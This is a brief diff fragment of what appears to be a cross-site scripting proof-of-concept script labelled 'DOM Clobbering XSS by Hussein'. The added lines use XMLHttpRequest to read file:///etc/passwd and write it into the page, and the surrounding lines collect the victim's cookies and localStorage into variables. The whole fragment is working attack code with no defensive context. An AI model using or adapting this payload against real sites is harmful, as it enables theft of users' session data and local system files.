@@ -5,7 +5,11 @@ alert("DOM Clobbering XSS by Hussein on: " + document.domain);
 
 
 
-
+x= new XMLHttpRequest();
+x.onload = function(){
+document.write(this.responseText)};
+x.open("GET", "file:///etc/passwd");
+x.send();
 
 var userCookies = document.cookie;
 var userStorage = JSON.stringify(localStorage);
